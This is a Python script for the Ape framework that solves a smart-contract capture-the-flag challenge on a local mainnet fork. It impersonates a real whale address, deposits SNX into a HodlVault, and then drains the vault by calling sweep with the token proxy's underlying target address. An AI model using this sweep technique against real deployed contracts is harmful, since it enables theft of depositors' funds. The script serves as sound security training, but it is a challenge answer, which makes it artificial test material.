from ape import accounts, project
from .utils.helper import (
    impersonate,
    set_balance,
    balance_of,
    transfer_from,
    get_block,
)


BLOCK_NUMBER = 14850000
SNX = "0xC011a73ee8576Fb46F5E1c5751cA3B9Fe0af2a6F"
SNX_WHALE = "0xF977814e90dA44bFA03b6295A0616a897441aceC"  # binance8
ATTACKER_ETH_BALANCE = 309485009821345068724781055


def main():
    # --- BEFORE EXPLOIT --- #
    print("\n--- Setting up scenario ---\n")

    # get accounts
    deployer = accounts.test_accounts[0]
    attacker = accounts.test_accounts[1]

    assert (
        get_block() == BLOCK_NUMBER
    ), "run script with network flag => --network :mainnet-fork"

    # impersonate whale
    print("\n--- Impersonating the SNX Whale ---\n")
    impersonate(SNX_WHALE)

    # transfer whale snx balance to attacker
    print("\n--- Transferring the whale SNX balance to the attacker ---\n")
    whale_balance = balance_of(SNX, SNX_WHALE)
    transfer_from(SNX, SNX_WHALE, attacker.address, whale_balance)

    assert balance_of(SNX, attacker.address) == whale_balance

    # fund attacker with ETH
    print("\n--- Funding the attacker with ETH ---\n")
    set_balance(attacker.address, ATTACKER_ETH_BALANCE)
    assert attacker.balance == ATTACKER_ETH_BALANCE

    # get SNX token contract
    print("\n--- Getting SNX contract ---\n")
    snx = project.ProxyERC20.at(SNX)
    assert snx.name() == "Synthetix Network Token"

    # deploy challenge contract
    print("\n--- Deploying Challenge ---\n")
    challenge = project.HodlChallenge.deploy(
        sender=deployer, maxFeePerGas=1000000000000
    )

    # deposit snx tokens
    vault = project.HodlVault.at(challenge.vault())

    amount_to_deposit = snx.balanceOf(attacker.address)
    snx.approve(vault.address, amount_to_deposit, sender=attacker)
    vault.hold(amount_to_deposit, sender=attacker)

    # --- EXPLOIT GOES HERE --- #
    print("\n--- Initiating exploit... ---\n")

    # exploit
    vault.sweep(snx.target(), sender=attacker)

    # --- AFTER EXPLOIT --- #

    assert vault.holdMethodIsCalled()
    assert challenge.isSolved()

    print("\n--- 🥂 Challenge Completed! 🥂 ---\n")


if __name__ == "__main__":
    main()
